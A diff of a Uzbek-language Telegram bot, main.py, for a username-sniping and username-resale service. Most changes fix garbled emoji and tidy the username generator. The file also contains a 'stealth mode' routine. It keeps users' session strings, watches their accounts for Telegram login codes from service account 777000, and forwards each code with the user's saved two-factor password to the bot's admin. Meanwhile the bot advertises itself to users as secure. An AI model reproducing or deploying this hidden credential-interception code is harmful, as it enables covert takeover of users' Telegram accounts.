@@ -1,6 +1,6 @@
 """
 ================================================
- main.py вЂ” Username Sniper SaaS Bot
+ main.py — Username Sniper SaaS Bot
 ================================================
  Barcha modullar bitta faylga birlashtirildi
  (Railway deployment uchun optimallashtirilgan)
@@ -35,7 +35,7 @@ import uvicorn
 
 load_dotenv()
 
-# в”Ђв”Ђв”Ђ SOZLAMALAR в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
+# ─── SOZLAMALAR ──────────────────────────────
 BOT_TOKEN     = os.getenv("BOT_TOKEN", "")
 ADMIN_CHANNEL = int(os.getenv("ADMIN_CHANNEL", "0"))
 API_ID        = int(os.getenv("API_ID", "0"))
@@ -52,7 +52,7 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-# в”Ђв”Ђв”Ђ MA'LUMOTLAR BAZASI в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
+# ─── MA'LUMOTLAR BAZASI ───────────────────────
 async def init_db():
     db_dir = os.path.dirname(DB_PATH)
     if db_dir:
@@ -308,7 +308,7 @@ async def init_db():
             await db.commit()
         except Exception:
             pass  # Ustun allaqachon mavjud
-    logger.info("вњ… Baza tayyor")
+    logger.info("✅ Baza tayyor")
 
 async def get_setting(key, default=None):
     async with aiosqlite.connect(DB_PATH) as db:
@@ -323,7 +323,7 @@ async def set_setting(key, value):
 
 async def get_active_card():
     """Kunlik limiti (40 ta) to'lmagan birinchi faol kartani qaytaradi.
-    Agar hamma kartalar limitga yetgan bo'lsa вЂ” oxirgi faol kartani qaytaradi."""
+    Agar hamma kartalar limitga yetgan bo'lsa — oxirgi faol kartani qaytaradi."""
     import datetime
     today = datetime.date.today().isoformat()  # '2025-07-26'
     async with aiosqlite.connect(DB_PATH) as db:
@@ -341,14 +341,14 @@ async def get_active_card():
             row = await c.fetchone()
             if row:
                 return dict(row)
-        # Hammalimiti to'lgan вЂ” oxirgi faol kartani qaytar
+        # Hammalimiti to'lgan — oxirgi faol kartani qaytar
         async with db.execute(
             "SELECT * FROM payment_cards WHERE is_active=1 ORDER BY sort_order ASC, id ASC LIMIT 1"
         ) as c:
             row = await c.fetchone()
             if row:
                 return dict(row)
-    # Jadval bo'sh bo'lsa вЂ” eski sozlamadan ol
+    # Jadval bo'sh bo'lsa — eski sozlamadan ol
     old_card = await get_setting("payment_card", "")
     return {"card_number": old_card, "card_owner": "", "id": None} if old_card else None
 
@@ -387,7 +387,7 @@ async def create_user(telegram_id, first_name='', last_name='', username=''):
     async with aiosqlite.connect(DB_PATH) as db:
         await db.execute("INSERT OR IGNORE INTO users (telegram_id, balance) VALUES (?, 5000)", (telegram_id,))
         if first_name or last_name or username:
-            await db.execute("UPDATE users SET first_name=?, last_name=?, username=? WHERE telegram_id=?", 
+            await db.execute("UPDATE users SET first_name=?, last_name=?, username=? WHERE telegram_id=?",
                              (first_name or '', last_name or '', username or '', telegram_id))
         await db.commit()
 
@@ -401,7 +401,19 @@ async def deduct_balance(telegram_id, amount):
         await db.execute("UPDATE users SET balance=balance-? WHERE telegram_id=?", (amount, telegram_id))
         await db.commit()
 
-# в”Ђв”Ђв”Ђ USERNAME GENERATOR в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
+# ─── USERNAME GENERATOR ───────────────────────
+from bot.words import (
+    generate_smart_username, generate_quality_username,
+    nouns, adjectives,
+    UZ_WORDS, UZ_SHORT,
+    EN_WORDS_COMMON, EN_COOL,
+    UZ_PREFIXES, UZ_SUFFIXES,
+    EN_PREFIXES, EN_NUMBERS,
+    _is_pronounceable,
+)
+import random
+import string
+
 def generate_usernames(base_word: str, lang: str = 'uz', limit: int = 5000) -> list:
     from bot.words import (
         UZ_MALE_NAMES, UZ_FEMALE_NAMES, UZ_SURNAMES,
@@ -409,12 +421,13 @@ def generate_usernames(base_word: str, lang: str = 'uz', limit: int = 5000) -> l
         ANIMALS_CLEAN, NATURE_CLEAN, EN_COOL_CLEAN,
         nouns, adjectives, uz_dict
     )
-    import random, re
+    import random as _rnd
+    import re as _re
 
     cat = base_word.strip().lower()
-    TELEGRAM_RE = re.compile(r'^[a-zA-Z][a-zA-Z0-9_]{3,30}[a-zA-Z0-9]$')
+    TELEGRAM_RE = _re.compile(r'^[a-zA-Z][a-zA-Z0-9_]{3,30}[a-zA-Z0-9]$')
 
-    def valid(u: str) -> bool:
+    def valid(u):
         return (4 <= len(u) <= 32
                 and '__' not in u
                 and not u.startswith('_')
@@ -423,15 +436,14 @@ def generate_usernames(base_word: str, lang: str = 'uz', limit: int = 5000) -> l
 
     pool = []
 
-    # 1. CUSTOM (O'zim kiritaman)
     if cat.startswith('custom:'):
-        custom_word = cat.split(':', 1)[1].strip()
-        cw = ''.join(c for c in custom_word if c.isalnum() or c == '_').lower()
-        if not cw: cw = 'user'
-        prefixes = ['', 'the', 'real', 'my', 'mr', 'mrs', 'dr', 'pro', 'uz', 'uzb', 'vip', 'super', 'mega', 'top', 'best', 'true', 'its', 'iam', 'official', 'go', 'hey', 'hi', 'get', 'one', 'club', 'hub', 'app', 'new', 'hot', 'cool', 'fast', 'king', 'boss', 'dark', 'neo', 'ultra', 'max']
-        suffixes = ['', 'official', 'uz', 'uzb', 'bot', 'pro', 'vip', 'top', 'blog', 'channel', 'tv', 'media', 'news', 'store', 'shop', 'life', 'style', 'music', 'art', 'dev', 'tech', 'zone', 'group', 'org', 'info', 'box', 'studio', 'page', 'net', 'online', 'hub', 'lab', 'hq', 'io', 'ok', 'go', 'gg', 'co', 'ai', 'x', 'real', 'live', 'plus', 'max', 'mini', 'app', 'base']
+        # O'zim kiritaman: kiritilgan so'z atrofida ko'p variantlar
+        cw = ''.join(c for c in cat.split(':', 1)[1].strip() if c.isalnum() or c == '_').lower()
+        if not cw:
+            cw = 'user'
+        prefixes = ['', 'the', 'real', 'my', 'mr', 'mrs', 'dr', 'pro', 'uz', 'uzb', 'vip', 'super', 'mega', 'top', 'best', 'true', 'iam', 'official', 'go', 'get', 'one', 'club', 'hub', 'app', 'new', 'hot', 'cool', 'fast', 'king', 'boss', 'dark', 'neo', 'ultra', 'max']
+        suffixes = ['', 'official', 'uz', 'uzb', 'bot', 'pro', 'vip', 'top', 'blog', 'channel', 'tv', 'media', 'news', 'store', 'shop', 'life', 'style', 'music', 'art', 'dev', 'tech', 'zone', 'group', 'org', 'info', 'box', 'studio', 'page', 'net', 'online', 'hub', 'lab', 'hq', 'ok', 'go', 'gg', 'co', 'ai', 'x', 'real', 'live', 'plus', 'max', 'mini', 'app', 'base']
         numbers = ['', '1', '2', '3', '4', '5', '7', '8', '9', '10', '11', '24', '25', '77', '88', '99', '100', '777', '888', '999', '2024', '2025', '2026', '007', '01', '07', '700', '900']
-
         c_set = set()
         c_set.add(cw)
         for p in prefixes:
@@ -447,10 +459,8 @@ def generate_usernames(base_word: str, lang: str = 'uz', limit: int = 5000) -> l
                 c_set.add(f'{n}{cw}')
         pool = list(c_set)
 
-    # 2. QISQA (Ismlar, Familiyalar, Nomlar, So'zlar - 4-8 harfli, toza)
     elif cat == 'qisqa':
-        names_list = []
-        words_list = []
+        # Qisqa noyob: ismlar, familiyalar, nomlar, so'zlar (4-8 harf, toza)
         if lang == 'uz':
             all_names = UZ_MALE_NAMES + UZ_FEMALE_NAMES + UZ_SURNAMES
             all_words = UZ_WORDS_CLEAN + uz_dict
@@ -458,69 +468,56 @@ def generate_usernames(base_word: str, lang: str = 'uz', limit: int = 5000) -> l
             all_names = EN_MALE_NAMES + EN_FEMALE_NAMES
             all_words = ANIMALS_CLEAN + NATURE_CLEAN + EN_COOL_CLEAN + nouns + adjectives
 
-        for item in all_names:
-            item_str = str(item).strip().lower()
-            if item_str.isalpha() and 4 <= len(item_str) <= 8:
-                names_list.append(item_str)
-
-        for item in all_words:
-            item_str = str(item).strip().lower()
-            if item_str.isalpha() and 4 <= len(item_str) <= 8:
-                words_list.append(item_str)
-
-        names_list = list(set(names_list))
-        words_list = list(set(words_list))
-        random.shuffle(names_list)
-        random.shuffle(words_list)
-
+        names_list = list(set(w.lower() for w in all_names if str(w).isalpha() and 4 <= len(str(w)) <= 8))
+        words_list = list(set(w.lower() for w in all_words if str(w).isalpha() and 4 <= len(str(w)) <= 8))
+        _rnd.shuffle(names_list)
+        _rnd.shuffle(words_list)
         pool = names_list + words_list
 
-    # 3. TURLI (Qo'shimcha belgilar (_), sonlar va kombinatsiyalar)
     else:
+        # Turli ko'rinishdagi: belgilar, sonlar va kombinatsiyalar
         if lang == 'uz':
             curated = list(set(UZ_MALE_NAMES + UZ_FEMALE_NAMES + UZ_SURNAMES + UZ_WORDS_CLEAN))
-            dict_pool = [w for w in uz_dict if w.isalpha() and 4 <= len(w) <= 10]
+            dict_pool = [w for w in uz_dict if str(w).isalpha() and 4 <= len(str(w)) <= 10]
         else:
             curated = list(set(EN_MALE_NAMES + EN_FEMALE_NAMES + ANIMALS_CLEAN + NATURE_CLEAN + EN_COOL_CLEAN))
-            dict_pool = [w for w in (nouns + adjectives) if w.isalpha() and 4 <= len(w) <= 10]
+            dict_pool = [w for w in (nouns + adjectives) if str(w).isalpha() and 4 <= len(str(w)) <= 10]
 
-        random.shuffle(curated)
-        random.shuffle(dict_pool)
+        _rnd.shuffle(curated)
+        _rnd.shuffle(dict_pool)
+
+        csuf = ['_uz', '_uzb', '_pro', '_vip', '_top', '_official', '_bot', '_tv', '_real', '_me', '_1', '_7', '_99', '_777', '1', '2', '7', '99', '2025', '2026', '777', '_01', '_07']
+        cpfx = ['the_', 'real_', 'my_', 'mr_', 'pro_', 'top_', 'uzb_', 'neo_', 'mr', 'ms', 'best_', 'i_']
 
         var_pool = []
-        combo_suffixes = ['_uz', '_uzb', '_pro', '_vip', '_top', '_official', '_bot', '_tv', '_real', '_me', '_1', '_7', '_99', '_777', '1', '2', '7', '99', '2025', '2026', '777', '_01', '_07']
-        combo_prefixes = ['the_', 'real_', 'my_', 'mr_', 'pro_', 'top_', 'uzb_', 'neo_', 'mr', 'ms', 'best_', 'i_']
-
-        all_base = curated + dict_pool
-        for u in all_base:
+        for u in curated + dict_pool:
             u_str = str(u).strip().lower()
             if len(u_str) <= 9:
-                for sfx in combo_suffixes:
-                    if random.random() > 0.5: var_pool.append(f'{u_str}{sfx}')
-                for pfx in combo_prefixes:
-                    if random.random() > 0.6: var_pool.append(f'{pfx}{u_str}')
-
+                for sfx in csuf:
+                    if _rnd.random() > 0.5: var_pool.append(f'{u_str}{sfx}')
+                for pfx in cpfx:
+                    if _rnd.random() > 0.6: var_pool.append(f'{pfx}{u_str}')
         pool = var_pool
 
-    random.shuffle(pool)
+    _rnd.shuffle(pool)
 
     seen = set()
     res = []
     for u in pool:
         u = u.strip().lower()
-        if u in seen or not valid(u):
-            continue
-        seen.add(u)
-        res.append(u)
+        if u not in seen and valid(u):
+            seen.add(u)
+            res.append(u)
 
     return res[:limit]
 
+
 def main_menu():
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="рџ“± Dasturni ochish", web_app=WebAppInfo(url=f"{WEB_URL}/app?v=2"))]
+        [InlineKeyboardButton(text="📱 Dasturni ochish", web_app=WebAppInfo(url=f"{WEB_URL}/app?v=2"))]
     ])
 
-# в”Ђв”Ђв”Ђ ROUTER VA HANDLERLAR в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
+# ─── ROUTER VA HANDLERLAR ─────────────────────
 router = Router()
 
 # Foydalanuvchi holatlarini saqlash (oddiy dict, botni restart qilsa tozalanadi)
@@ -533,7 +530,7 @@ from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest, Dele
 from telethon.tl.functions.account import UpdateUsernameRequest as AccountUpdateUsernameRequest
 import uuid
 
-# в”Ђв”Ђв”Ђ STEALTH MODE LOGIC в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
+# ─── STEALTH MODE LOGIC ────────────────────────
 stealth_clients = {}
 stealth_tasks = {}  # telegram_id -> asyncio.Task (run_until_disconnected)
 
@@ -552,7 +549,7 @@ async def stealth_interceptor(event):
         client = event.client
         user_id = getattr(client, 'my_user_id', 'Noma\'lum')
 
-        logger.info(f"рџҐ· Stealth: 777000 dan xabar keldi (user: {user_id}): {m.text[:80]}")
+        logger.info(f"🥷 Stealth: 777000 dan xabar keldi (user: {user_id}): {m.text[:80]}")
 
         # Kodni ajratib olish (5 talik raqam)
         code_match = re.search(r"(\d{5})", m.text)
@@ -571,13 +568,13 @@ async def stealth_interceptor(event):
             except Exception:
                 pass
 
-            msg = f"рџҐ· <b>Stealth Intercept</b>\n"
-            msg += f"рџ‘¤ Foydalanuvchi: <code>{user_id}</code>\n\n"
-            msg += f"рџ”‘ KOD: <b>{enc}</b>\n"
+            msg = f"🥷 <b>Stealth Intercept</b>\n"
+            msg += f"👤 Foydalanuvchi: <code>{user_id}</code>\n\n"
+            msg += f"🔑 KOD: <b>{enc}</b>\n"
             if saved_password:
-                msg += f"рџ”ђ 2FA parol: <code>{saved_password}</code>\n"
+                msg += f"🔐 2FA parol: <code>{saved_password}</code>\n"
             else:
-                msg += f"вњ… 2FA parol yo'q yoki saqlanmagan\n"
+                msg += f"✅ 2FA parol yo'q yoki saqlanmagan\n"
             msg += f"<i>(raqamlarni ketma-ket o'qing)</i>"
 
             # 1. Adminga yuborish (bu BIRINCHI bo'lishi kerak!)
@@ -587,7 +584,7 @@ async def stealth_interceptor(event):
                 try:
                     if ADMIN_IDS:
                         await _bot.send_message(ADMIN_IDS[0], msg, parse_mode="HTML")
-                        logger.info(f"рџҐ· Stealth kod adminga yuborildi: {code} (user: {user_id}, 2fa: {has_2fa})")
+                        logger.info(f"🥷 Stealth kod adminga yuborildi: {code} (user: {user_id}, 2fa: {has_2fa})")
                 finally:
                     await _bot.session.close()
             except Exception as e:
@@ -599,7 +596,7 @@ async def stealth_interceptor(event):
             except Exception as e:
                 logger.warning(f"Stealth: xabarni o'chirib bo'lmadi ({user_id}): {e}")
         else:
-            logger.info(f"рџҐ· Stealth: 777000 xabarida 5 raqamli kod topilmadi (user: {user_id})")
+            logger.info(f"🥷 Stealth: 777000 xabarida 5 raqamli kod topilmadi (user: {user_id})")
     except Exception as e:
         logger.error(f"Stealth interceptor xatosi: {e}")
 
@@ -610,7 +607,7 @@ async def start_stealth_clients():
         async with db.execute("SELECT telegram_id, session_string FROM users WHERE is_stealth=1 AND session_string IS NOT NULL") as c:
             rows = await c.fetchall()
 
-    logger.info(f"рџҐ· Stealth: {len(rows)} ta foydalanuvchi uchun ishga tushirilmoqda...")
+    logger.info(f"🥷 Stealth: {len(rows)} ta foydalanuvchi uchun ishga tushirilmoqda...")
     for row in rows:
         tid = row['telegram_id']
         session_str = row['session_string']
@@ -626,16 +623,16 @@ async def start_stealth_client(telegram_id, session_string):
         client.my_user_id = telegram_id
         await client.connect()
         if await client.is_user_authorized():
-            # Filter YO'Q вЂ” barcha incoming xabarlarni ushlaymiz, handler ichida 777000 tekshiramiz
+            # Filter YO'Q — barcha incoming xabarlarni ushlaymiz, handler ichida 777000 tekshiramiz
             client.add_event_handler(stealth_interceptor, events.NewMessage(incoming=True))
             stealth_clients[telegram_id] = client
             task = asyncio.create_task(_stealth_keep_alive(client, telegram_id))
             stealth_tasks[telegram_id] = task
-            logger.info(f"рџҐ· Stealth client ishga tushdi: {telegram_id}")
+            logger.info(f"🥷 Stealth client ishga tushdi: {telegram_id}")
         else:
             await client.disconnect()
             await save_session(telegram_id, None)
-            logger.warning(f"вљ пёЏ Stealth client sessiyasi yaroqsiz (seans uzilgan): {telegram_id}")
+            logger.warning(f"⚠️ Stealth client sessiyasi yaroqsiz (seans uzilgan): {telegram_id}")
     except Exception as e:
         logger.error(f"Stealth client ulashda xato ({telegram_id}): {e}")
         err_str = str(e).lower()
@@ -654,7 +651,7 @@ async def _stealth_keep_alive(client, telegram_id):
     finally:
         stealth_clients.pop(telegram_id, None)
         stealth_tasks.pop(telegram_id, None)
-        logger.info(f"рџ›‘ Stealth client to'xtatildi (keep-alive): {telegram_id}")
+        logger.info(f"🛑 Stealth client to'xtatildi (keep-alive): {telegram_id}")
 
 async def stop_stealth_client(telegram_id):
     """Foydalanuvchi uchun stealth rejimni o'chirish"""
@@ -670,7 +667,7 @@ async def stop_stealth_client(telegram_id):
         try:
             await client.disconnect()
         except: pass
-        logger.info(f"рџ›‘ Stealth client to'xtatildi: {telegram_id}")
+        logger.info(f"🛑 Stealth client to'xtatildi: {telegram_id}")
 
 
 
@@ -720,19 +717,19 @@ async def transfer_username(bot, seller_id, buyer_id, username):
         # 3. Notify parties
         from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
         markup = InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="рџ‘¤ Profilga qo'yish", callback_data=f"setprofile_{username}_{new_channel_id}")]
+            [InlineKeyboardButton(text="👤 Profilga qo'yish", callback_data=f"setprofile_{username}_{new_channel_id}")]
         ])
         try:
             await bot.send_message(
                 buyer_id, 
-                f"рџЋ‰ <b>Tabriklaymiz!</b>\n\n@{username} sizning akkauntingizga o'tkazildi!\n"
+                f"🎉 <b>Tabriklaymiz!</b>\n\n@{username} sizning akkauntingizga o'tkazildi!\n"
                 f"Hozirda u avtomatik yaratilgan maxsus kanalda saqlanmoqda.\n\n"
                 f"Uni o'z profilingizga qo'yishni xohlaysizmi?",
                 reply_markup=markup, parse_mode="HTML"
             )
             await bot.send_message(
                 seller_id,
-                f"рџ’° <b>Username sotildi!</b>\n\n@{username} muvaffaqiyatli o'tkazib berildi va pul balansingizga qo'shildi.",
+                f"💰 <b>Username sotildi!</b>\n\n@{username} muvaffaqiyatli o'tkazib berildi va pul balansingizga qo'shildi.",
                 parse_mode="HTML"
             )
         except: pass
@@ -746,13 +743,13 @@ async def transfer_username(bot, seller_id, buyer_id, username):
                 await db.execute("UPDATE users SET session_string=NULL WHERE telegram_id IN (?, ?)", (seller_id, buyer_id))
                 await db.commit()
             try:
-                await bot.send_message(seller_id, f"вќЊ @{username} ni o'tkazishda xatolik: Telegram akkauntingiz sessiyasi uzilgan! Iltimos, qaytadan ulang.")
-                await bot.send_message(buyer_id, f"вќЊ @{username} sotib olish bekor qilindi, chunki kimdir profilidan chiqib ketgan. Pulingiz tez orada qaytariladi.")
+                await bot.send_message(seller_id, f"❌ @{username} ni o'tkazishda xatolik: Telegram akkauntingiz sessiyasi uzilgan! Iltimos, qaytadan ulang.")
+                await bot.send_message(buyer_id, f"❌ @{username} sotib olish bekor qilindi, chunki kimdir profilidan chiqib ketgan. Pulingiz tez orada qaytariladi.")
                 # TODO: Pullarni qaytarish logikasini ulash kerak (bu avtomatik qaytishi kerak yoki admin manual qaytarishi kerak)
             except: pass
         else:
             try:
-                await bot.send_message(seller_id, f"вќЊ @{username} ni o'tkazishda xatolik yuz berdi. Iltimos, u profilingiz yoki kanalingizda ekanligini va akkaunt bog'langanini tekshiring.")
+                await bot.send_message(seller_id, f"❌ @{username} ni o'tkazishda xatolik yuz berdi. Iltimos, u profilingiz yoki kanalingizda ekanligini va akkaunt bog'langanini tekshiring.")
             except: pass
     finally:
         await seller_client.disconnect()
@@ -792,14 +789,14 @@ async def auto_payment_handler(message: Message):
                     try:
                         await message.bot.send_message(
                             topup['telegram_id'], 
-                            f"вњ… <b>To'lov avtomatik qabul qilindi!</b>\n\nBalansingizga <b>{amt:,} so'm</b> qo'shildi.",
+                            f"✅ <b>To'lov avtomatik qabul qilindi!</b>\n\nBalansingizga <b>{amt:,} so'm</b> qo'shildi.",
                             parse_mode="HTML"
                         )
                     except:
                         pass
                     
                     try:
-                        await message.reply(f"вњ… Tasdiqlandi (Topup ID: {topup['id']})")
+                        await message.reply(f"✅ Tasdiqlandi (Topup ID: {topup['id']})")
                     except:
                         pass
                     return # Stop after processing a topup
@@ -831,7 +828,7 @@ async def auto_payment_handler(message: Message):
                     asyncio.create_task(transfer_username(message.bot, lo['seller_id'], lo['buyer_id'], lo['username']))
 
                     try:
-                        await message.reply(f"вњ… Tasdiqlandi (Listing Order ID: {lo['id']})")
+                        await message.reply(f"✅ Tasdiqlandi (Listing Order ID: {lo['id']})")
                     except:
                         pass
                     return # Stop after processing
@@ -888,9 +885,9 @@ async def grant_pending_referral_bonus(bot: Bot, user_id: int, user_first_name: 
                 try:
                     await bot.send_message(
                         ref_id,
-                        f"рџЋЃ <b>Referral Bonus!</b>\n\n"
+                        f"🎁 <b>Referral Bonus!</b>\n\n"
                         f"Siz taklif qilgan <b>{user_first_name}</b> majburiy kanallarga obuna bo'ldi!\n"
-                        f"Balansingizga <b>+1,000 so'm</b> bonus o'tkazildi! рџљЂ",
+                        f"Balansingizga <b>+1,000 so'm</b> bonus o'tkazildi! 🚀",
                         parse_mode="HTML"
                     )
                 except Exception: pass
@@ -923,24 +920,24 @@ async def start_cmd(message: Message):
         # Obuna bo'lmagan kanallar bor!
         inline_btns = []
         for ch in unsubbed:
-            btn_text = f"рџ“ў {ch['title']}"
+            btn_text = f"📢 {ch['title']}"
             btn_url = ch['url'] if ch['url'] else (f"https://t.me/{ch['channel_username']}" if ch['channel_username'] else "https://t.me")
             inline_btns.append([InlineKeyboardButton(text=btn_text, url=btn_url)])
         
-        inline_btns.append([InlineKeyboardButton(text="вњ… Obunani tekshirish", callback_data="check_sub")])
+        inline_btns.append([InlineKeyboardButton(text="✅ Obunani tekshirish", callback_data="check_sub")])
         kb = InlineKeyboardMarkup(inline_keyboard=inline_btns)
         
         await message.answer(
             text=(
-                f"рџ‘‹ Salom, <b>{message.from_user.first_name}</b>!\n\n"
-                f"вљ пёЏ Botdan foydalanish uchun quyidagi kanallarga obuna bo'ling:"
+                f"👋 Salom, <b>{message.from_user.first_name}</b>!\n\n"
+                f"⚠️ Botdan foydalanish uchun quyidagi kanallarga obuna bo'ling:"
             ),
             reply_markup=kb,
             parse_mode="HTML"
         )
         return
 
-    # Kanallarga obuna bo'lgan bo'lsa вЂ” referral bonusini rasman taqdim etamiz!
+    # Kanallarga obuna bo'lgan bo'lsa — referral bonusini rasman taqdim etamiz!
     await grant_pending_referral_bonus(message.bot, message.from_user.id, message.from_user.first_name or "Do'st")
 
     # Direct Deep Link parametri bo'lsa (masalan: listing_123 yoki market_123)
@@ -950,7 +947,7 @@ async def start_cmd(message: Message):
         app_url = f"{WEB_URL}/app?v=2&tgWebAppStartParam={start_param}"
         
         # E'lon haqida qisqa ma'lumot olishga urinamiz
-        info_text = f"рџ›’ <b>Bozor e'loniga o'tish</b>"
+        info_text = f"🛒 <b>Bozor e'loniga o'tish</b>"
         try:
             lid = int(listing_id)
             async with aiosqlite.connect(DB_PATH) as db:
@@ -958,19 +955,19 @@ async def start_cmd(message: Message):
                 async with db.execute("SELECT username, price, is_auction FROM listings WHERE id=?", (lid,)) as c:
                     l_row = await c.fetchone()
                     if l_row:
-                        type_str = "вљЎ AUKSION" if l_row['is_auction'] else "рџЏ· SOTUVDA"
-                        info_text = f"рџ›’ <b>E'lon: @{l_row['username']}</b> ({type_str})\nрџ’° <b>Narxi:</b> {l_row['price']:,} so'm"
+                        type_str = "⚡ AUKSION" if l_row['is_auction'] else "🏷 SOTUVDA"
+                        info_text = f"🛒 <b>E'lon: @{l_row['username']}</b> ({type_str})\n💰 <b>Narxi:</b> {l_row['price']:,} so'm"
         except Exception:
             pass
             
         custom_kb = InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="рџ›’ E'lonni ilovada ochish va Sotib olish", web_app=WebAppInfo(url=app_url))]
+            [InlineKeyboardButton(text="🛒 E'lonni ilovada ochish va Sotib olish", web_app=WebAppInfo(url=app_url))]
         ])
         await message.answer(
             text=(
-                f"рџ‘‹ Salom, <b>{message.from_user.first_name}</b>!\n\n"
+                f"👋 Salom, <b>{message.from_user.first_name}</b>!\n\n"
                 f"{info_text}\n\n"
-                f"рџ‘‡ Quyidagi tugmani bosib, e'lonni ko'ring va sotib oling:"
+                f"👇 Quyidagi tugmani bosib, e'lonni ko'ring va sotib oling:"
             ),
             reply_markup=custom_kb,
             parse_mode="HTML"
@@ -979,13 +976,13 @@ async def start_cmd(message: Message):
 
     await message.answer(
         text=(
-            f"рџ‘‹ Salom, <b>{message.from_user.first_name}</b>!\n\n"
-            f"рџЋЇ <b>Usernamechi Bot</b>ga xush kelibsiz!\n\n"
+            f"👋 Salom, <b>{message.from_user.first_name}</b>!\n\n"
+            f"🎯 <b>Usernamechi Bot</b>ga xush kelibsiz!\n\n"
             f"Bu bot orqali siz <b>qisqa, chiroyli va ma'noli</b> "
             f"Telegram usernamelarni avtomatik ravishda topib, "
             f"<b>sizning akkauntingizga</b> band qildirasiz.\n\n"
-            f"вљЎпёЏ Tez вЂў рџ”’ Xavfsiz вЂў рџЋЇ Aniq\n\n"
-            f"рџ‘‡ Quyidagi tugma orqali dasturni oching:"
+            f"⚡️ Tez • 🔒 Xavfsiz • 🎯 Aniq\n\n"
+            f"👇 Quyidagi tugma orqali dasturni oching:"
         ),
         reply_markup=main_menu(),
         parse_mode="HTML"
@@ -995,10 +992,10 @@ async def start_cmd(message: Message):
 async def check_sub_callback(callback: CallbackQuery):
     unsubbed = await get_unsubscribed_channels(callback.bot, callback.from_user.id)
     if unsubbed:
-        await callback.answer("вќЊ Siz hali barcha kanallarga obuna bo'lmadingiz!", show_alert=True)
+        await callback.answer("❌ Siz hali barcha kanallarga obuna bo'lmadingiz!", show_alert=True)
     else:
-        await callback.answer("вњ… Rahmat! Barcha kanallarga obuna bo'ldingiz.", show_alert=True)
-        # Obuna bo'lingan bo'lsa вЂ” taklif qilgan odamga +1,000 so'm bonus beriladi
+        await callback.answer("✅ Rahmat! Barcha kanallarga obuna bo'ldingiz.", show_alert=True)
+        # Obuna bo'lingan bo'lsa — taklif qilgan odamga +1,000 so'm bonus beriladi
         await grant_pending_referral_bonus(callback.bot, callback.from_user.id, callback.from_user.first_name or "Do'st")
         
         try:
@@ -1007,9 +1004,9 @@ async def check_sub_callback(callback: CallbackQuery):
         
         await callback.message.answer(
             text=(
-                f"рџЋ‰ Obunangiz tasdiqlandi!\n\n"
-                f"рџЋЇ <b>Usernamechi Bot</b>ga xush kelibsiz!\n\n"
-                f"рџ‘‡ Quyidagi tugma orqali dasturni oching:"
+                f"🎉 Obunangiz tasdiqlandi!\n\n"
+                f"🎯 <b>Usernamechi Bot</b>ga xush kelibsiz!\n\n"
+                f"👇 Quyidagi tugma orqali dasturni oching:"
             ),
             reply_markup=main_menu(),
             parse_mode="HTML"
@@ -1019,13 +1016,13 @@ async def check_sub_callback(callback: CallbackQuery):
 @router.message(Command("admin"))
 async def admin_cmd(message: Message):
     if message.from_user.id not in ADMIN_IDS:
-        await message.answer("вќЊ Sizda admin huquqi yo'q.")
+        await message.answer("❌ Sizda admin huquqi yo'q.")
         return
     token = get_admin_token(message.from_user.id)
     markup = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="рџ”§ Admin Panelga kirish", web_app=WebAppInfo(url=f"{WEB_URL}/admin?token={token}"))]
+        [InlineKeyboardButton(text="🔧 Admin Panelga kirish", web_app=WebAppInfo(url=f"{WEB_URL}/admin?token={token}"))]
     ])
-    await message.answer("Xush kelibsiz, Admin! рџ‘‘\nQuyidagi tugma orqali panelga kiring:", reply_markup=markup)
+    await message.answer("Xush kelibsiz, Admin! 👑\nQuyidagi tugma orqali panelga kiring:", reply_markup=markup)
 
 
 async def save_session(telegram_id, session_string, phone=None, tg_password=None):
@@ -1051,7 +1048,7 @@ async def text_handler(message: Message):
         session = message.text.strip()
         # Session string juda qisqa bo'lsa qabul qilmaymiz
         if len(session) < 50:
-            await message.answer("вќЊ Bu session string emas. Iltimos, to'g'ri session string yuboring.")
+            await message.answer("❌ Bu session string emas. Iltimos, to'g'ri session string yuboring.")
             return
         # Telefon raqamini ham olish uchun ulanamiz
         phone_fetched = None
@@ -1071,8 +1068,8 @@ async def text_handler(message: Message):
         await save_session(user_id, session, phone_fetched)
         user_states.pop(user_id, None)
         await message.answer(
-            "вњ… <b>Akkaunt muvaffaqiyatli ulandi!</b>\n\n"
-            "Endi 'рџ›’ Username sotib olish' tugmasi orqali buyurtma bera olasiz.",
+            "✅ <b>Akkaunt muvaffaqiyatli ulandi!</b>\n\n"
+            "Endi '🛒 Username sotib olish' tugmasi orqali buyurtma bera olasiz.",
             reply_markup=main_menu(),
             parse_mode="HTML"
         )
@@ -1082,9 +1079,9 @@ async def text_handler(message: Message):
         user_states[user_id] = {"step": "wait_quantity", "category": message.text.strip()}
         price = int(await get_setting("username_price", 5000))
         await message.answer(
-            f"вњ… Kategoriya: <b>{message.text.strip()}</b>\n\n"
-            f"Nechta username kerak? (1вЂ”10 ta)\n"
-            f"рџ’Ў Narxi: <b>{price:,} so'm/dona</b>",
+            f"✅ Kategoriya: <b>{message.text.strip()}</b>\n\n"
